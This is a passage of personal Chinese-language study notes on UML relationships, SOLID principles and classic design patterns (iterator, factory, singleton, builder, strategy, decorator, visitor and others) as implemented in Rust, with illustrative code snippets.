<ul>
<li>表示的是PrintClass实现了接口Printable。</li>
</ul>
<blockquote>
<p>【Rust】的Interface就是Trait，Trait比Interface更强大。实现Interface就是实现Trait。</p>
</blockquote>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// rust要求方法snake命名
trait Printable {
    fn print(&amp;self);
    fn new_page(&amp;self);
}

struct PrintClass {
    ...
}

impl Printable for PrintClass {
    fn print(&amp;self){
        ...
    }
    fn new_page(&amp;self){
        ...
    }
}
<span class="boring">}
</span></code></pre></pre>
<h3 id="聚合组合"><a class="header" href="#聚合组合">聚合/组合</a></h3>
<img src="Language/Rust/Practice/../images/image-20210815195803563.png" alt="image-20210815195803563" style="zoom:50%;" />
<p>该图展示了Color（颜色）、Fruit（水果）、Basket（果篮）这 3个类之间的关系。Basket类中的 fruits字段是可以存放 Fruit 类型数据的数组，在一个Basket类的实例中可以持有多个Fruit 类的实例;Fruit 类中的 color字段是Color类型，一个Fruit类实例中只能持有一个 Color 类的实例。通俗地说就是在篮子中可以放入多个水果，每个水果都有其自身的颜色。</p>
<p>组合和聚合的区别在于前者持有所有权，后者持有引用。在Java/Python等语言中这没什么区别，不过在Rust中这区别大了。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>struct Color {...}
struct Fruit {
    color : Color,
    ...
}
struct Basket {
    fruit : Vec&lt;Fruit&gt;,
}
<span class="boring">}
</span></code></pre></pre>
<h3 id="可见性-1"><a class="header" href="#可见性-1">可见性</a></h3>
<p><img src="Language/Rust/Practice/../images/image-20210815200601109.png" alt="image-20210815200601109" /></p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 我觉得Rust只有两种可以和上面的对应。不过Rust的Pub其实更加复杂 
// https://doc.rust-lang.org/reference/visibility-and-privacy.html
struct Something{
    pub public_filed : i64,
    package_field : i64,
}
<span class="boring">}
</span></code></pre></pre>
<h3 id="类的关联"><a class="header" href="#类的关联">类的关联</a></h3>
<p><img src="Language/Rust/Practice/../images/image-20210815202939185.png" alt="image-20210815202939185" /></p>
<h3 id="时序图"><a class="header" href="#时序图">时序图</a></h3>
<p><img src="Language/Rust/Practice/../images/image-20210815203131431.png" alt="image-20210815203131431" /></p>
<h2 id="solid原则"><a class="header" href="#solid原则">SOLID原则</a></h2>
<ul>
<li>Single Responsibility Principle: </li>
<li>Open/closed Principle: 对于扩展类应该是开放的，对于修改类应该是封闭的。</li>
<li>Liskov Substitution Principle: 当你扩展一个类时， 记住你应该要能在不修改客户端代码的情况下将子类的对象作为父类对象进行传递。</li>
<li>Interface Segregation Principle: 尽量缩小接口的范围，使得客户端的类不必实现其不需要的行为。</li>
<li>Dependency Inversion Principle: 高层次的类不应该依赖于低层次的类。 两者都应该依赖于抽象接口。抽象接口不应依赖于具体实现。具体实现应该依赖于抽象接口。</li>
</ul>
<h2 id="23个设计模式"><a class="header" href="#23个设计模式">23个设计模式</a></h2>
<h3 id="1-iterator-模式"><a class="header" href="#1-iterator-模式">1. Iterator 模式</a></h3>
<h4 id="介绍-1"><a class="header" href="#介绍-1">介绍</a></h4>
<p><img src="Language/Rust/Practice/../images/image-20210815212823688.png" alt="image-20210815212823688" /></p>
<p>可以将遍历和实现分开来。这样<strong>无论底层的容器实现</strong>是什么，都可以用一样的方法遍历。</p>
<h4 id="代码"><a class="header" href="#代码">代码</a></h4>
<p>参考<a href="https://doc.rust-lang.org/src/core/iter/traits/iterator.rs.html#59-3437">Rust标准库</a>。两个抽象类的定义</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// &lt;&lt;interface&gt;&gt; Aggregate 
// iterator -&gt; into_iter
impl&lt;I: Iterator&gt; IntoIterator for I {
    type Item = I::Item;
    type IntoIter = I;
    fn into_iter(self) -&gt; I {
        self
    }
}
// &lt;&lt;interface&gt;&gt; Iterator
// 因为有Option所以只需要一个next足矣
trait Iterator {
    type Item;
    fn next(&amp;mut self) -&gt; Option&lt;Self::Item&gt;;

    // ...
}
<span class="boring">}
</span></code></pre></pre>
<p>具体实现的例子，这里是Rust中的数组。所以我们自己实现的话，不需要定义抽象类，这个Rust已经帮我们定义好了就是<code>Iterator</code>，我们需要做的事帮我们的类型规定好<code>Iterator</code>怎么实现（主要就是<code>next</code>方法），然后我们的类（多半是容器）怎么<code>IntoIterator</code>。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// ConcreteIterator -&gt; IntoIter
pub struct IntoIter&lt;T, const N: usize&gt; {
    data: [MaybeUninit&lt;T&gt;; N],
    alive: Range&lt;usize&gt;,
}
impl&lt;T, const N: usize&gt; Iterator for IntoIter&lt;T, N&gt; {
    type Item = T;
    fn next(&amp;mut self) -&gt; Option&lt;Self::Item&gt; {
        self.alive.next().map(|idx| {
            unsafe { self.data.get_unchecked(idx).assume_init_read() }
        })
    }
}

// ConcreteAggregate -&gt; [T;N] &amp;[T,N] &amp;mut[T,N]
// iterator -&gt; into_iter
// https://doc.rust-lang.org/src/core/array/mod.rs.html#160
// Rust由于存在所有权的概念，所以一般的方法都有into_iter,iter,iter_mut三个具体的实现
impl&lt;T, const N: usize&gt; IntoIterator for [T; N] {
    type Item = T;
    type IntoIter = IntoIter&lt;T, N&gt;;
    fn into_iter(self) -&gt; Self::IntoIter {
        IntoIter::new(self)
    }
}
impl&lt;'a, T, const N: usize&gt; IntoIterator for &amp;'a [T; N] {
    type Item = &amp;'a T;
    type IntoIter = Iter&lt;'a, T&gt;;

    fn into_iter(self) -&gt; Iter&lt;'a, T&gt; {
        self.iter()
    }
}
impl&lt;'a, T, const N: usize&gt; IntoIterator for &amp;'a mut [T; N] {
    type Item = &amp;'a mut T;
    type IntoIter = IterMut&lt;'a, T&gt;;

    fn into_iter(self) -&gt; IterMut&lt;'a, T&gt; {
        self.iter_mut()
    }
} 
<span class="boring">}
</span></code></pre></pre>
<p>虽然说<code>Iterator</code>只用实现最基础的<code>next</code>方法，然后自动实现其他的方法如<code>nth()</code>。但是你完全可以根据数据的组织形式，为你的<code>ConcreteIterator</code>实现更高效的其他方法，比如如果数据是连续的就可以用<code>O(1)</code>的代价实现<code>nth()</code>，但是为了接口的一致性还是要消耗掉之前的元素。</p>
<h3 id="2-adapter-模式"><a class="header" href="#2-adapter-模式">2. Adapter 模式</a></h3>
<h4 id="使用场景-4"><a class="header" href="#使用场景-4">使用场景</a></h4>
<p>适配器模式是一种事后的补救策略，用来补救设计上的缺陷。应用这种模式算是“无奈之举”。如果在设计初期，我们就能规避接口不兼容的问题，那这种模式就无用武之地了。在实际的开发中，什么情况下才会出现接口不兼容呢？下面这5种场景：</p>
<ul>
<li>封装有缺陷的接口设计</li>
<li>统一多个类的接口设计</li>
<li>替换依赖的外部系统</li>
<li>兼容老版本接口</li>
<li>适配不同格式的数据</li>
</ul>
<h4 id="介绍-2"><a class="header" href="#介绍-2">介绍</a></h4>
<p>类似“HDMI转VGA线”一样，我们原来的电脑上是HDMI接口（原来的实现），但是现在<strong>需求发生了变化</strong>需要VGA接口，我们不想把电脑拆了把接口换成VGA接口（修改原来的代码），那么我们就用一根线来把HDMI转换成VGA（适配器），这样原来的HDMI接口可以接着使用，使用者就对着转接线提供的VGA插就完事了。</p>
<p><img src="Language/Rust/Practice/../images/image-20210815223328663.png" alt="image-20210815223328663" /></p>
<h4 id="代码-1"><a class="header" href="#代码-1">代码</a></h4>
<p>一下子没有想到很好的例子。我觉得在Rust中就直接考虑第二种了。</p>
<h3 id="3-template-method-模式"><a class="header" href="#3-template-method-模式">3. Template Method 模式</a></h3>
<h4 id="介绍-3"><a class="header" href="#介绍-3">介绍</a></h4>
<p><img src="Language/Rust/Practice/../images/image-20210815230232566.png" alt="image-20210815230232566" /></p>
<p>之前望文生义，以为模板方法对应的就是C++中的模板。不过仔细一看，其实这就是简单的一个父类定义接口、子类实现接口的过程。在Rust中，这就是定义一个trait然后去实现它。下面是我之前以为的模板的作用</p>
<blockquote>
<p>模板模式有两大作用：复用和扩展。其中复用指的是，所有的子类可以复用父类中提供的模板方法的代码。扩展指的是，框架通过模板模式提供功能扩展点，让框架用户可以在不修改框架源码的情况下，基于扩展点定制化框架的功能。</p>
<p>如果两个类的方法有共同点，那就可以抽出来。比如上面的迭代器模式。在Rust中，这其实有两种实现方法，分别是静态分发的模板和动态分发的Trait对象。</p>
</blockquote>
<h3 id="4-factory-method-模式"><a class="header" href="#4-factory-method-模式">4. Factory Method 模式</a></h3>
<h4 id="介绍-4"><a class="header" href="#介绍-4">介绍</a></h4>
<p><img src="Language/Rust/Practice/../images/image-20210816100759308.png" alt="image-20210816100759308" /></p>
<p>简单的说，工厂ConcreteCreator根据传递的不同参数，返回不同的类实例Concrete。如果只有一个Concrete的话意义不大，如果有多个Concrete，而且每个Concrete都有相似之处会比较合理，method就是相似之处。</p>
<h4 id="代码-2"><a class="header" href="#代码-2">代码</a></h4>
<p>假设我们有两个很类似的Product。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// Abstract Product
trait Color{
    fn output_color(&amp;self);  
}
enum ColorType {
    Red,
    Blue,
}
// Concrete Product
struct RedColor;
struct BlueColor;

// method
impl Color for RedColor {
    fn output_color(&amp;self) {
        println!(&quot;red color.&quot;);
    }
}
impl Color for BlueColor {
    fn output_color(&amp;self) {
        println!(&quot;blue color.&quot;);
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>那么工厂就是</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>struct ColorFactory; 
impl ColorFactory{
    // 注意这里的动态派发
    // 不能直接返回Color，因为是大小不定的。要用Box包装，或者其他的指针。
    fn new_color(&amp;self, color_type: ColorType) -&gt; Box&lt;dyn Color&gt; {
        match color_type {
            ColorType::Red =&gt; Box::new(RedColor{}),
            ColorType::Blue =&gt; Box::new(BlueColor{}),
        }
    }
    fn new() -&gt; Self {
        ColorFactory{}
    }
}
<span class="boring">}
</span></code></pre></pre>
<h3 id="5-singleton-模式"><a class="header" href="#5-singleton-模式">5. Singleton 模式</a></h3>
<h4 id="介绍及使用场景"><a class="header" href="#介绍及使用场景">介绍及使用场景</a></h4>
<p>在整个运行过程中只会产生一个实例。比如对某些硬件资源的抽象就可能会使用，或者是一些全局性的管理的变量。</p>
<p><img src="Language/Rust/Practice/../images/image-20210816105852525.png" alt="image-20210816105852525" /></p>
<h4 id="代码-3"><a class="header" href="#代码-3">代码</a></h4>
<blockquote>
<p>【Rust】如果单例不需要修改，直接用全局变量就好了。但是【Rust】全局变量初始化中的函数调用是有限制的：“The only functions that can be called in static or constant expressions are <code>const</code> functions, and struct/enum constructors.”。</p>
<p>所以，可以<a href="https://doc.rust-lang.org/error-index.html#E0015">把构造函数（Rust其实没有直接的概念）声明成const</a>，或者使用<a href="https://crates.io/crates/lazy_static">lazy_static</a>。</p>
<p>【Rust】如果单例需要修改，那用全局变量就是一个Unsafe的行为了（线程不安全）。</p>
<ol>
<li>
<p>你可以用锁</p>
</li>
<li>
<p>也可以使用标准库<a href="https://doc.rust-lang.org/std/cell/index.html">Cell</a>和第三方库<a href="https://crates.io/crates/once_cell">once_cell</a>的帮助来帮我们实现单例模式，他的使用场景是ffi，调用外部函数完成初始化，或者是在程序运行到某个节点才初始化。他提供了线程安全的版本。</p>
</li>
</ol>
</blockquote>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不可变版本
#[macro_use]
extern crate lazy_static;
// FILE_NAME 就可以当作一个正常的全局变量使用了
lazy_static!{
    static ref FILE_NAME : String = String::from(&quot;1234&quot;);
}
<span class="boring">}
</span></code></pre></pre>
<pre><pre class="playground"><code class="language-rust">use once_cell::sync::OnceCell;
// 这就是一个全局可变的变量了，只能设置一次值（构造），无限制的get
static CELL: OnceCell&lt;String&gt; = OnceCell::new();

fn main() {
    assert_eq!(&quot;a&quot;, CELL.get_or_init(|| &quot;a&quot;.to_string()));
    assert_eq!(&quot;a&quot;, CELL.get_or_init(|| &quot;b&quot;.to_string()));
    assert!(CELL.set(&quot;b&quot;.to_string()).is_err());
    assert_eq!(&quot;a&quot;, CELL.get_or_init(|| &quot;b&quot;.to_string()));
    assert_eq!(&quot;a&quot;, CELL.get().unwrap());
}
</code></pre></pre>
<h3 id="6-prototype-模式"><a class="header" href="#6-prototype-模式">6. Prototype 模式</a></h3>
<h4 id="介绍及使用场景-1"><a class="header" href="#介绍及使用场景-1">介绍及使用场景</a></h4>
<p>在 Java 中，我们可以使用<code>new</code>关键字指定类名来生成类的实例。像这样使用new来生成实例时，是必须指定类名的。但是，在开发过程中，有时候也会有&quot;在不指定类名的前提下生成实例&quot;的需求。例如，在以下情况下，我们就不能根据类来生成实例，而要根据现有的实例来生成新的实例。</p>
<ol>
<li>对象种类繁多，无法将它们整合到一个类中时。第一种情况是需要处理的对象太多，如果将它们分别作为—个类。必须要编写很多个类文件。</li>
<li>难以根据类生成实例时。第二种情况是生成实例的过程太过复杂，很难根据类来生成实例。例如，我们假设这里有一个实例，即表示用户在图形编辑器中使用鼠标制作出的图形的实例。想在程序中创建这样的实例是非常困难的。通常，在想生成一个和之前用户通过操作所创建出的实例完全一样的实例的时候，我们会事先将用户通过操作所创建出的实例保存起来，然后在需要时通过复制来生成新的实例。</li>
<li>想解耦框架与生成的实例时。第三种情况是想要让生成实例的框架不依赖干具体的类。这时。不能指定类名来生成实例，而要事先&quot;注册&quot;一个&quot;原型&quot;实例，然后通过复制该实例来生成新的实例。</li>
</ol>
<p>说实话我还没有很理解这个使用场景。</p>
<p><img src="Language/Rust/Practice/../images/image-20210816121254911.png" alt="image-20210816121254911" /></p>
<h4 id="代码-4"><a class="header" href="#代码-4">代码</a></h4>
<p>对于一般的<strong>浅拷贝</strong>，<code>#[derive(Clone)]</code>还可以自动生成。甚至clone也不是必须的，还可以 序列化-反序列化 来实现。</p>
<h3 id="7-builder-模式-star2"><a class="header" href="#7-builder-模式-star2">7. Builder 模式 :star2:</a></h3>
<h4 id="介绍及使用场景-2"><a class="header" href="#介绍及使用场景-2">介绍及使用场景</a></h4>
<p>使用多个简单的对象构造一个复杂的对象。当一个类的构造函数参数个数超过4个，而且这些参数有些是可选的参数，考虑使用构造者模式。</p>
<p><img src="Language/Rust/Practice/../images/image-20210816142454266.png" alt="image-20210816142454266" /></p>
<h4 id="代码-5"><a class="header" href="#代码-5">代码</a></h4>
<p>没有必要构造抽象类，和上面的UML图其实不太一样。建造者模式在Rust中有两种写法，注意传参的类型。第二种写起来更爽，但是如果结构体很大的话意味着更多的栈上的复制，我不知道这个会不会被优化掉，不过在<code>build_x</code>,<code>build_y</code>前面加上<code>#[inline]</code>肯定是可以避免掉栈复制的。然而，我觉得创建结构体应该一般不会成为性能的瓶颈吧，具体问题具体分析。</p>
<pre><pre class="playground"><code class="language-rust">struct ConcreteBuilder {
    x: i32,
    y: i32,
}

struct ConcreteStruct {
    x: i32,
    y: i32,
}

impl ConcreteBuilder {
    fn new() -&gt; Self {
        Self { x: 0, y: 0 }
    }
    // 其实代码分成两种情况，参考https://doc.rust-lang.org/1.0.0/style/ownership/builders.html，分别是字段不可复制和可复制的版本
    // 实际上这个代码可能非常复杂，不是简单的赋值，否则也就没有意义了
    fn build_x(&amp;mut self, x: i32) -&gt; &amp;mut Self {
        self.x = x;
        self
    }
    fn build_y(&amp;mut self, y: i32) -&gt; &amp;mut Self {
        self.y = y;
        self
    }
    fn build(self) -&gt; ConcreteStruct {
        ConcreteStruct {
            x: self.x,
            y: self.y,
        }
    }
}

fn main() {
    let mut builder = ConcreteBuilder::new();
    builder.build_x(11).build_y(22);
    let instance = builder.build();
    assert_eq!(instance.x, 11);
    assert_eq!(instance.y, 22);
}
</code></pre></pre>
<pre><pre class="playground"><code class="language-rust">struct ConcreteBuilder {
    x: i32,
    y: i32,
}

struct ConcreteStruct {
    x: i32,
    y: i32,
}

impl ConcreteBuilder {
    fn new() -&gt; Self {
        Self { x: 0, y: 0 }
    }
    // 其实代码分成两种情况，参考https://doc.rust-lang.org/1.0.0/style/ownership/builders.html，分别是字段不可复制和可复制的版本
    // 实际上这个代码可能非常复杂，不是简单的赋值，否则也就没有意义了
    fn build_x(mut self, x: i32) -&gt; Self {
        self.x = x;
        self
    }
    fn build_y(mut self, y: i32) -&gt; Self {
        self.y = y;
        self
    }
    fn build(self) -&gt; ConcreteStruct {
        ConcreteStruct {
            x: self.x,
            y: self.y,
        }
    }
}

fn main() {
    let instance = ConcreteBuilder::new().build_x(11).build_y(22).build();
    assert_eq!(instance.x, 11);
    assert_eq!(instance.y, 22);
}
</code></pre></pre>
<h3 id="8-abstract-factory-模式"><a class="header" href="#8-abstract-factory-模式">8. Abstract Factory 模式</a></h3>
<p>这个不知道干啥用。生产工厂的工厂。</p>
<h3 id="9-bridge-模式"><a class="header" href="#9-bridge-模式">9. Bridge 模式</a></h3>
<p>在Rust中桥接模式根本就不是问题。为一个struct实现多个trait是基本操作。</p>
<h3 id="10-strategy-模式"><a class="header" href="#10-strategy-模式">10. Strategy 模式</a></h3>
<h4 id="介绍-5"><a class="header" href="#介绍-5">介绍</a></h4>
<p>将算法和其他部分分开来，定义了算法的API在程序中以委托的方式来使用算法。让我想起了操作系统中的调度算法，可以通过这种方式来选择算法，书上举了象棋AI强度的例子。</p>
<p><img src="Language/Rust/Practice/../images/image-20210816200043023.png" alt="image-20210816200043023" /></p>
<p>Context提供算法需要的参数，Strategy只是描述了接口，具体的实现有Concrete Strategy实现。</p>
<p>如果你觉的当前的算法不具有普适性，将来可能会修改或为不同场景添加不同算法就比较适合使用这种设计模式。否则的话也不用分那么细。一个很好的Rust例子是<code>serde</code>库的实现。参考<a href="https://serde.rs/data-model.html">Serde Data Model</a>。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub trait Serialize {
    fn serialize&lt;S&gt;(&amp;self, serializer: S) -&gt; Result&lt;S::Ok, S::Error&gt;
    where
        S: Serializer;
}
// 定义了具体结构化每个类型的方法，比如
pub trait ser::Serializer: Sized {
    fn serialize_bool(self, v: bool) -&gt; Result&lt;Self::Ok, Self::Error&gt;;
    ...
}

// 具体的结构化的方法会去
impl ser::Serializer for &amp;'a mut serde_json::Serializer {
    fn serialize_bool(self, value: bool) -&gt; Result&lt;()&gt; {
        self.formatter.write_bool(&amp;mut self.writer, value).map_err(Error::io))?
        Ok(())
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>当我们为我们的struct <code>#[derive(Serialize)]</code>的时候，他并不是帮我们将我们的struct转换成了一个中间的表示结构，然后再交给具体的方法。为了高效性，<code>Serialize::setialize</code>实际上做的事情，是将当前的数据<code>self</code>，分发给具体的<code>serializer</code>，调用<code>serializer</code>不同的方法。不过由于Rust并不能运行时反射，类型信息只在编译器存有，所以用宏是唯一的选择。如果忽略封装，考虑设计模式的运用，可以有如下的Demo，也算是<code>serde_json::to_string</code>的简化版了</p>
<pre><pre class="playground"><code class="language-rust">use serde::Serialize;

#[derive(Serialize)]
struct MyStruct {
    x: i32,
    y: i32,
}

impl MyStruct {
    fn new() -&gt; Self {
        Self { x: 1, y: 2 }
    }
}

fn to_json&lt;T&gt;(my_struct: T) -&gt; String
where
    T: Serialize,
{
    let mut writer = Vec::new();
    let mut serializer = serde_json::Serializer::new(&amp;mut writer);
    my_struct.serialize(&amp;mut serializer).unwrap();
    String::from_utf8(writer).unwrap()
}
fn main() {
    let my_struct = MyStruct::new();
    // {&quot;x&quot;:1,&quot;y&quot;:2}
    println!(&quot;{}&quot;, to_json(my_struct))
}
</code></pre></pre>
<h3 id="11-composite-模式"><a class="header" href="#11-composite-模式">11. Composite 模式</a></h3>
<p>结构里面有一个容器，可以包含子类和其他的容器。形成一个树形结构。这个让我想起了语法树啊。<a href="Language/Rust/Practice/../Compiler/pest.html"><code>pest</code>库里面的Pair</a>类应该是一个很典型的例子。</p>
<h3 id="12-decorator-模式--star"><a class="header" href="#12-decorator-模式--star">12. Decorator 模式  :star:</a></h3>
<h4 id="介绍及使用场景-3"><a class="header" href="#介绍及使用场景-3">介绍及使用场景</a></h4>
<p>看到这个名字第一反应是Python中的装饰器，想到装饰器之后又想到了<code>#[derive()]</code>，所以是不是这样呢。原来不止我有这个想法，参考https://users.rust-lang.org/t/are-derive-macros-in-rust-similar-to-decorators-in-python/46686，意思是说两者目的相似，但是前者是函数闭包，后者是代码生成。</p>
<p>decorator模式的定义是<strong>动态地</strong>给一个<strong>对象</strong>添加一些<strong>额外的职责</strong>。这个模式的好处：认证，权限检查，记日志，检查参数，加锁，等等等等，这些功能和系统业务无关，但又是系统所必须的，说的更明白一点，就是面向方面的编程（AOP）。所以，Python的Decorator就是Decorator模式的语言级支持。</p>
<p>在Rust中也许可以用宏魔法来实现和Python类似的效果。我看网上的代码感觉实现起来没有Python优雅，如果能用类似于<code>#[derive()]</code>的方式实现就好了，确实可以用过程宏来实现！</p>
<h4 id="代码-6"><a class="header" href="#代码-6">代码</a></h4>
<p>一个还不稳定的库 pydeco 提供了类似于Python decorator的宏。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use pydeco::deco;

fn logging&lt;F&gt;(func: F) -&gt; impl Fn(i32) -&gt; i32
where
    F: Fn(i32) -&gt; i32,
{
    move |i| {
        println!(&quot;Input = {}&quot;, i);
        let out = func(i);
        println!(&quot;Output = {}&quot;, out);
        out
    }
}

#[deco(logging)]
fn add2(i: i32) -&gt; i32 {
    i + 2
}

add2(2);
<span class="boring">}
</span></code></pre></pre>
<p>事实上整个库的代码刨去注释和测试才不到100行，可惜我不会宏，先放在这里。https://github.com/termoshtt/deco/blob/master/src/lib.rs。光是想一下的话，是把 <em>原函数</em> 当成一个参数传递给 <em>装饰函数</em>，然后用 <em>装饰函数</em> 替换 <em>原函数</em>。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use anyhow::{bail, Result};
use proc_macro::TokenStream;
use proc_macro2::TokenTree;
use syn::*;

#[proc_macro_attribute]
pub fn deco(attr: TokenStream, func: TokenStream) -&gt; TokenStream {
    let func = func.into();
    let item_fn: ItemFn = syn::parse(func).expect(&quot;Input is not a function&quot;);
    let vis = &amp;item_fn.vis;
    let ident = &amp;item_fn.sig.ident;
    let block = &amp;item_fn.block;

    let inputs = item_fn.sig.inputs;
    let output = item_fn.sig.output;

    let input_values: Vec&lt;_&gt; = inputs
        .iter()
        .map(|arg| match arg {
            &amp;FnArg::Typed(ref val) =&gt; &amp;val.pat,
            _ =&gt; unimplemented!(&quot;#[deco] cannot be used with associated function&quot;),
        })
        .collect();

    let attr = DecoratorAttr::parse(attr.into()).expect(&quot;Failed to parse attribute&quot;);
    let caller = match attr {
        DecoratorAttr::Fixed { name } =&gt; {
            quote::quote! {
<span class="boring">                vis fn #ident(#inputs) #output {
</span>                    let f = #name(deco_internal);
                    return f(#(#input_values,) *);

                    fn deco_internal(#inputs) #output #block
                }
            }
        }
        DecoratorAttr::Parametric { name, args } =&gt; {
            quote::quote! {
<span class="boring">                vis fn #ident(#inputs) #output {
</span>                    let deco = #name(#(#args,) *);
                    let f = deco(deco_internal);
                    return f(#(#input_values,) *);

                    fn deco_internal(#inputs) #output #block
                }
            }
        }
    };
    caller.into()
}

#[derive(Debug, PartialEq)]
enum DecoratorAttr {
    Fixed { name: Ident },
    Parametric { name: Ident, args: Vec&lt;Expr&gt; },
}

impl DecoratorAttr {
    fn parse(attr: proc_macro2::TokenStream) -&gt; Result&lt;Self&gt; {
        let mut ident = None;
        let mut args = Vec::new();
        for at in attr {
            match at {
                TokenTree::Ident(id) =&gt; {
                    ident = Some(id);
                }
                TokenTree::Group(grp) =&gt; {
                    if ident.is_none() {
                        bail!(&quot;Invalid token stream&quot;);
                    }
                    for t in grp.stream() {
                        if let Ok(expr) = syn::parse2(t.into()) {
                            args.push(expr);
                        }
                    }
                }
                _ =&gt; bail!(&quot;Invalid token stream&quot;),
            }
        }
        if let Some(name) = ident {
            if args.is_empty() {
                Ok(DecoratorAttr::Fixed { name })
            } else {
                Ok(DecoratorAttr::Parametric { name, args })
            }
        } else {
            bail!(&quot;Decorator name not found&quot;);
        }
    }
}
<span class="boring">}
</span></code></pre></pre>
<h3 id="13--visitor-模式-star2"><a class="header" href="#13--visitor-模式-star2">13.  Visitor 模式 :star2:</a></h3>
<h4 id="使用场景-5"><a class="header" href="#使用场景-5">使用场景</a></h4>
<ul>
<li>一个数据结构如（List/Set/Map等）包含很多类型对象</li>
<li>数据结构与数据操作分离</li>
</ul>
<h4 id="介绍-6"><a class="header" href="#介绍-6">介绍</a></h4>
<ul>
<li>
<p>定义：将作用于某种数据结构中的各元素的操作分离出来封装成独立的类，使其在不改变数据结构的前提下可以添加作用于这些元素的新的操作，为数据结构中的每个元素提供多种访问方式。它将对数据的操作与数据结构进行分离，是行为类模式中最复杂的一种模式。可以在不改变各元素的类的前提下，定义作用于这些元素的操作。</p>
</li>
<li>
<p>访问者模式建议将新行为放入一个名为访问者的独立类中，不是试图将其整合到已有类中。现在，需要执行操作的原
始对象将作为参数被传递给访问者中的方法，让方法能访问对象所包含的一切必要数据。</p>
<p><img src="Language/Rust/Practice/../images/image-20210816231734025.png" alt="image-20210816231734025" /></p>
</li>
</ul>
<h4 id="代码-7"><a class="header" href="#代码-7">代码</a></h4>
<p>以下内容参考《Rust编程之道》 By 张汉东</p>
<p>访问者模式一般包含两个层次：</p>
<ol>
<li>定义需要操作的元素</li>
<li>定义相关的操作</li>
</ol>
<p>再看<a href="https://rust-unofficial.github.io/patterns/patterns/behavioural/visitor.html">链接</a>给出的代码(其实就在下面)。<code>Element</code>是抽象语法树，他的种类是非常稳定的，只有<code>Statement</code>, <code>Name</code>, <code>Expression</code>三种。但是我们在分析语言的时候，肯定是把他们存在一起。也就是说有很多<strong>异构的数据存在一起</strong>，我们给每种数据定义统一的visit方法——<code>visit_expr</code>,<code>visit_name</code>,<code>visit_expr</code>。这时候，我们按照不同访问需求——比如为了Intepreter，再去定义具体的visit行为。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// element
mod ast {
    pub enum Stmt {
        Expr(Expr),
        Let(Name, Expr),
    }

    pub struct Name {
        value: String,
    }

    pub enum Expr {
        IntLit(i64),
        Add(Box&lt;Expr&gt;, Box&lt;Expr&gt;),
        Sub(Box&lt;Expr&gt;, Box&lt;Expr&gt;),
    }
}

// The abstract visitor
mod visit {
    use ast::*;

    pub trait Visitor&lt;T&gt; {
        fn visit_name(&amp;mut self, n: &amp;Name) -&gt; T;
        fn visit_stmt(&amp;mut self, s: &amp;Stmt) -&gt; T;
        fn visit_expr(&amp;mut self, e: &amp;Expr) -&gt; T;
    }
}

use visit::*;
use ast::*;

// An example concrete visitor - walks the AST interpreting it as code.
struct Interpreter;
impl Visitor&lt;i64&gt; for Interpreter {
    fn visit_name(&amp;mut self, n: &amp;Name) -&gt; i64 { panic!() }
    fn visit_stmt(&amp;mut self, s: &amp;Stmt) -&gt; i64 {
        match *s {
            Stmt::Expr(ref e) =&gt; self.visit_expr(e),
            Stmt::Let(..) =&gt; unimplemented!(),
        }
    }

    fn visit_expr(&amp;mut self, e: &amp;Expr) -&gt; i64 {
        match *e {
            Expr::IntLit(n) =&gt; n,
            Expr::Add(ref lhs, ref rhs) =&gt; self.visit_expr(lhs) + self.visit_expr(rhs),
            Expr::Sub(ref lhs, ref rhs) =&gt; self.visit_expr(lhs) - self.visit_expr(rhs),
        }
    }
}

pub fn walk_expr(visitor: &amp;mut dyn Visitor, e: &amp;Expr) {
    match *e {
        Expr::IntLit(_) =&gt; {},
        Expr::Add(ref lhs, ref rhs) =&gt; {
            visitor.visit_expr(lhs);
            visitor.visit_expr(rhs);
        }
        Expr::Sub(ref lhs, ref rhs) =&gt; {
            visitor.visit_expr(lhs);
            visitor.visit_expr(rhs);
        }
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>总结上面两个例子，不难发现有共同点啊。</p>
<ol>
<li>数据Element是多样的，语法树的三个要素。</li>
<li>Visit的抽象定义是简单的，每一种Element来一个就好了。因为我们认为element是稳定的。</li>
<li>Visitor的具体实现是关键。为每一种不同的用途实现一批visit方法。</li>
<li>再真正使用的时候，用的是concrete element的accept方法，比如上面的<code>walk_expr</code>还是<code>walk_name</code>啥的。</li>
</ol>
<h3 id="14-chain-of-responsibility-模式"><a class="header" href="#14-chain-of-responsibility-模式">14. Chain of Responsibility 模式</a></h3>
<h4 id="介绍-7"><a class="header" href="#介绍-7">介绍</a></h4>
<p>推卸责任模式。Rust的错误处理就挺符合这个模式的。</p>
<h3 id="15-facade-模式"><a class="header" href="#15-facade-模式">15. Facade 模式</a></h3>
<h4 id="介绍及使用场景-4"><a class="header" href="#介绍及使用场景-4">介绍及使用场景</a></h4>
<p>当一个系统的功能越来越强，子系统会越来越多，客户对系统的访问也变得越来越复杂。这时如果系统内部发生改变，客户端也要跟着改变，这违背了“开闭原则”，也违背了“迪米特法则”，所以有必要为多个子系统提供一个统一的接口，从而降低系统的耦合度，这就是外观模式的目标。 </p>
<p>它通过封装细粒度的接口，提供组合各个细粒度接口的高层次接口，来提高接口的易用性，或者解决性能、分布式事务等问题。</p>
<h3 id="16-mediator-模式"><a class="header" href="#16-mediator-模式">16. Mediator 模式</a></h3>
